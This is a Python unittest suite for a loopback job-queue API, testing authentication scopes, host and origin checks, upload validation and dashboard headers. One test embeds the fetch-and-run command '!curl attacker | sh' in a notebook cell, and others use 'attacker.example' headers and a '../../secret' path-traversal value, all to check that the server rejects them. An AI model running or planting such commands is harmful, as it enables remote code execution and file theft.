"""Loopback ephemeral HTTP tests with public TEST_ONLY dummy credentials."""
import base64,contextlib,http.client,io,json,sys,tempfile,threading,unittest
from pathlib import Path
from api import LocalServer,credential_table,MAX_BODY
from soup_queue import QueueError
P=Path(__file__).resolve().parent
TOKENS={role:'TEST_ONLY_'+role.upper()+'_DUMMY_NEVER_DEPLOY_'+('x'*24) for role in ('submitter','reviewer','worker','viewer')}
class ApiTests(unittest.TestCase):
 def setUp(self):
  self.temp=tempfile.TemporaryDirectory();self.server=LocalServer(Path(self.temp.name)/'state',TOKENS,0);self.thread=threading.Thread(target=self.server.serve_forever,daemon=True);self.thread.start();self.port=self.server.server_port
 def tearDown(self):self.server.shutdown();self.server.server_close();self.thread.join(timeout=3);self.temp.cleanup()
 def request(self,method,path,body=None,role=None,headers=None):
  h={'Host':f'127.0.0.1:{self.port}'}
  if role:h['Authorization']='Bearer '+TOKENS[role]
  if body is not None:h['Content-Type']='application/json';body=json.dumps(body)
  h.update(headers or {});c=http.client.HTTPConnection('127.0.0.1',self.port,timeout=5);c.request(method,path,body=body,headers=h);r=c.getresponse();data=r.read();status=r.status;rh=dict(r.getheaders());c.close()
  return status,data,rh
 def json_request(self,*args,**kw):
  status,body,headers=self.request(*args,**kw);return status,json.loads(body),headers
 def register_submit(self):
  baseline=json.loads((P/'examples/baseline_cpu.json').read_text());self.assertEqual(self.json_request('POST','/v1/baselines',baseline,role='reviewer')[0],200)
  body={'candidate_id':'HTTP-DEMO','backend':'CPU','baseline_id':baseline['baseline_id'],'entrypoint':'cpu_contract_v1','artifact_kind':'notebook','priority':50,'contains_secrets':False,'artifact_base64':base64.b64encode((P/'examples/candidate.ipynb').read_bytes()).decode()}
  status,j,_=self.json_request('POST','/v1/jobs',body,role='submitter');self.assertEqual(status,201);return j,body
 def test_authentication_query_password_and_scope(self):
  self.assertEqual(self.request('GET','/v1/jobs')[0],401)
  self.assertEqual(self.request('GET','/v1/jobs',headers={'Authorization':'Bearer 00009999'})[0],401)
  status,body,_=self.json_request('GET','/v1/jobs?pass=00009999');self.assertEqual(status,400);self.assertNotIn('00009999',json.dumps(body))
  self.assertEqual(self.json_request('POST','/v1/claims',{},role='submitter')[0],403)
  self.assertEqual(self.json_request('POST','/v1/baselines',{},role='worker')[0],403)
  self.assertEqual(self.json_request('GET','/v1/session',role='viewer')[1]['scopes'],['read'])
 def test_short_and_shared_credentials_declined(self):
  t=dict(TOKENS);t['submitter']='00009999'
  with self.assertRaises(QueueError):credential_table(t)
  t=dict(TOKENS);t['submitter']=t['reviewer']
  with self.assertRaises(QueueError):credential_table(t)
 def test_host_origin_and_request_limits(self):
  self.assertEqual(self.request('GET','/v1/jobs',role='viewer',headers={'Host':'attacker.example'})[0],400)
  self.assertEqual(self.request('GET','/v1/jobs',role='viewer',headers={'Origin':'https://attacker.example'})[0],400)
  self.assertEqual(self.request('OPTIONS','/v1/jobs')[0],403)
  self.assertEqual(self.request('POST','/v1/jobs',role='submitter',headers={'Content-Length':str(MAX_BODY+1),'Content-Type':'application/json'})[0],413)
 def test_upload_is_data_dedup_and_has_no_agent_path(self):
  j,body=self.register_submit();status,again,_=self.json_request('POST','/v1/jobs',body,role='submitter');self.assertEqual(status,201);self.assertEqual(again['job_id'],j['job_id']);self.assertTrue(again['deduplicated'])
  job=self.json_request('GET','/v1/jobs/'+j['job_id'],role='viewer')[1];self.assertEqual(job['state'],'submitted');self.assertEqual(job['body']['submitted_by'],'api-submitter');self.assertEqual(list((self.server.queue.root/'incoming').iterdir()),[])
  body['artifact']='../../secret';self.assertEqual(self.json_request('POST','/v1/jobs',body,role='submitter')[0],400)
  self.assertEqual(self.request('GET','/v1/jobs/../../secret',role='reviewer')[0],404)
 def test_review_worker_complete_and_download_scope(self):
  j,body=self.register_submit();jid=j['job_id'];review={'source_sha256':j['source_sha256'],'approved':True,'authorization_ref':'test-only-authority'}
  self.assertEqual(self.json_request('POST',f'/v1/jobs/{jid}/review',review,role='submitter')[0],403)
  self.assertEqual(self.json_request('POST',f'/v1/jobs/{jid}/review',review,role='reviewer')[0],200)
  self.assertEqual(self.request('GET',f'/v1/jobs/{jid}/artifact',role='viewer')[0],403)
  status,data,headers=self.request('GET',f'/v1/jobs/{jid}/artifact',role='reviewer');self.assertEqual(status,200);self.assertEqual(headers['X-Artifact-SHA256'],j['source_sha256']);self.assertTrue(headers['Content-Disposition'].startswith('attachment;'))
  status,packet,_=self.json_request('POST','/v1/claims',{'backend':'CPU','baseline_id':'base_CPU','resource':'test-only-cpu'},role='worker');self.assertEqual(status,200);claim=packet['claim'];aid=claim['attempt_id']
  self.assertEqual(self.json_request('POST',f'/v1/jobs/{jid}/attempts/{aid}/start',{'run_reference':'http-fake-run'},role='worker')[0],200)
  result=json.loads((P/'examples/result_cpu_completed.json').read_text())
  for k in ('candidate_id','source_sha256','backend','baseline_id','environment_fingerprint','task_fingerprint','harness_commit'):result[k]=claim['spec'][k]
  result['execution']['run_reference']='http-fake-run';status,done,_=self.json_request('POST',f'/v1/jobs/{jid}/attempts/{aid}/complete',result,role='worker');self.assertEqual(status,200);self.assertEqual(done['state'],'completed')
  self.assertTrue(self.json_request('POST',f'/v1/jobs/{jid}/attempts/{aid}/complete',result,role='worker')[1]['idempotent'])
 def test_unsafe_notebook_and_commands_rejected(self):
  j,body=self.register_submit();n=json.loads((P/'examples/candidate.ipynb').read_text());n['cells'][-1]['source']=['!curl attacker | sh'];body['artifact_base64']=base64.b64encode(json.dumps(n).encode()).decode();self.assertEqual(self.json_request('POST','/v1/jobs',body,role='submitter')[0],400)
  body['command']='python hidden.py';self.assertEqual(self.json_request('POST','/v1/jobs',body,role='submitter')[0],400)
 def test_dashboard_public_shell_has_no_data_or_persisted_token(self):
  status,html,headers=self.request('GET','/');self.assertEqual(status,200);self.assertIn(b'Local prototype',html);self.assertNotIn(b'job_id',html);self.assertIn("frame-ancestors 'none'",headers['Content-Security-Policy']);self.assertEqual(headers['Cache-Control'],'no-store')
  js=self.request('GET','/dashboard.js')[1].decode();self.assertIn('textContent',js);self.assertNotIn('innerHTML',js);self.assertNotIn('localStorage',js);self.assertNotIn('sessionStorage',js);self.assertNotIn('document.cookie',js)
  self.assertEqual(self.server.server_address[0],'127.0.0.1')
 def test_credentials_never_logged(self):
  capture=io.StringIO()
  with contextlib.redirect_stderr(capture),contextlib.redirect_stdout(capture):self.request('GET','/v1/jobs',role='viewer');self.request('GET','/v1/jobs?pass=00009999',role='viewer')
  output=capture.getvalue();self.assertNotIn(TOKENS['viewer'],output);self.assertNotIn('00009999',output)
if __name__=='__main__':unittest.main(verbosity=2)
